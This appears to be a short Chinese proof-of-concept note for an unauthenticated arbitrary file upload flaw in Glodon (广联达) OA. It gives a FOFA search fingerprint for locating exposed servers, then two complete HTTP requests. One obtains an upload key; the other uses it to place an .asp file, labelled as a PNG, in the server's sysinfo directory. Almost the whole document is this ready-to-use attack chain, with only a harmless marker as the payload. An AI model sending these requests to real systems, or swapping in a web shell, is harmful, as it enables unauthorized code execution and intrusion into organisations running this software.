## 广联达OA前台任意文件上传

## fofa
```
fid="/yV4r5PdARKT4jaqLjJYqw=="
```
## 获得key
```
POST /Services/FileService/UserFiles/GetAuthorizeKey.ashx HTTP/1.1
Host: x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

cmd=&destDir=./sysinfo/&destFilename=qrxyrgwa.asp
```

将获取到的key 放到文件上传包
## 文件上传
```
POST /Services/FileService/UserFiles/UserFilesUpload.ashx HTTP/1.1
Host: x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Length: 555

------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="key"

f3c7e655-9ecf-4e81-a7c1-da2e1172ff7b
------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="destDir"

./sysinfo/
------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="destFilename"

qrxyrgwa.asp
------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="file";filename="qrxyrgwa.asp"
content-type:image/png

<% response.write("qrxyrgwa")%>
------WebKitFormBoundarytCOFhbEjc3IfYaY5--
```

## 漏洞来源
- https://mp.weixin.qq.com/s/4ri-afLF1knxX3IDV0hKjw
  
